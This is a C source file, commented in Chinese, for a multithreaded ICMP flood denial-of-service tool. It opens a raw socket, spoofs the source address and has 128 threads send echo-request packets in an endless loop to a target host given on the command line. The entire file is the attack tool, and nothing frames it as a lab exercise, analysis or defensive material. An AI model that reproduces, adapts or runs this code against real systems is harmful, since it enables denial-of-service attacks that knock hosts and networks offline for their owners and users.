#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#define MAXCHILD 128        //最多线程数
static unsigned long dest =0;   //目的IP地址
static int PROTO_ICMP=-1;       //ICMP协议的值
static int alive=-1;                //程序活动标志
static int rawsock;             //原始套接字创建返回值
 
 //函数声明
static inline long myrandom(int begin,int end); //自定义随机函数
static void Dos_fun(unsigned long ip);          //线程处理函数
static void Dos_icmp(void);                     //ICMP头部打包函数
static void Dos_sig();                         

 int main(int argc,char* argv[])
{
     struct hostent* host=NULL;
      struct protoent* protocol=NULL;
      char protoname[]="icmp";
      int i=0;
      pthread_t pthread[MAXCHILD];
      int err=-1;
      alive=1;

      signal(SIGINT,Dos_sig);     //截取信号ctrl+c
      if(argc<2)
     { 
          return -1;
      }
     protocol=getprotobyname(protoname);     //获取协议类型ICMP
     if(protocol==NULL)
      { 
          perror("getprotobyname()");
          return -1;
     }
      PROTO_ICMP=protocol->p_proto;
     dest=inet_addr(argv[1]);        //将输入字符串地址转换为网络地址
     if(dest==INADDR_NONE)
      { 
         host=gethostbyname(argv[1]);    //输入的主机地址为DNS地址
         if(host==NULL)
          { 
             perror("gethostbyname()");
              return -1;
         }
          //将地址复制到dest中
          memcpy((char *)&dest,host->h_addr,host->h_length);
     }
     //建立原始套接字
     //rawsock=socket(AF_INET,SOCK_RAW,RAW);       //建立原始socket
      //if(rawsock<0)
     //{ 
          rawsock=socket(AF_INET,SOCK_RAW,PROTO_ICMP);
       //}
      //设置IP选项
     setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));
     //建立多个线程协同工作
     for(i=0;i<MAXCHILD;i++)
    {
          err=pthread_create(&pthread[i],NULL,Dos_fun,NULL);
     }

      //等待线程结束
     for(i=0;i<MAXCHILD;i++)
      { 
      pthread_join(pthread[i],NULL);
   }
    close(rawsock);
     return 0;
 }

//自定义随机函数产生函数，由于rand()为伪随机函数，与其初始化srand()有关，因此每次用不同值进行初始化
 static inline long myrandom(int begin,int end)
 { 
     int gap=end-begin+1;
     int ret=0;
     //用系统时间初始化
      srand((unsigned)time(0));
     //产生一个介于begin和end之间的值
     ret=random()% gap+begin;
      return ret;
 }
 
 //线程函数Dos_fun
 static void Dos_fun(unsigned long ip)
 { 
     while(alive)
     { 
         Dos_icmp();
     }
 }
 

 static void Dos_sig()
 { 
      alive=0;
      printf("pthread exit!,线程退出！\n");
     return ;
}

//ICMP头部打包函数Dos_icmp
 static void Dos_icmp(void)
 { 
      struct sockaddr_in to;
      struct ip* iph;
      struct icmp* icmph;
      char* packet;
      int pktsize = sizeof(struct ip) + sizeof(struct icmp) + 64;
      packet = malloc(pktsize);
      iph = (struct ip*)packet;
      icmph = (struct icmp*)(packet + sizeof(struct ip));
      memset(packet, 0, pktsize);

      iph->ip_v = 4;            //IP的版本，IPv4
      iph->ip_hl = 5;           //IP的头部长度，字节数
      iph->ip_tos = 0;          //服务类型
      iph->ip_len = htons(pktsize);     //IP报文的总长度
      iph->ip_id = htons(getpid());     //标识，设置为pid
      iph->ip_off = 0;          // 段的偏移地址
      iph->ip_ttl = 0x0;        //生存时间ttl
      iph->ip_p = PROTO_ICMP;   //协议类型
      iph->ip_sum = 0;          //校验和，先填写为0
      iph->ip_src.s_addr = (unsigned long)myrandom(0, 65535);       //发送的源地址
	  //iph->ip_src.s_addr = inet_addr("192.168.85.188");; 
	  iph->ip_dst.s_addr = dest;       //发送目标地址

      icmph->icmp_type = ICMP_ECHO;         //ICMP类型为回显请求
      icmph->icmp_code = 0;         //代码为0
      //由于数据部分为0,并且代码为0,则直接不为0即icmp_type部分计算
      icmph->icmp_cksum = htons(~(ICMP_ECHO << 8));
      //填写发送目的地址部分
      to.sin_family = AF_INET;
      to.sin_addr.s_addr = iph->ip_dst.s_addr;
      to.sin_port = htons(0);
      //发送数据
      sendto(rawsock, packet, pktsize, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));
      free(packet);       //释放内存
}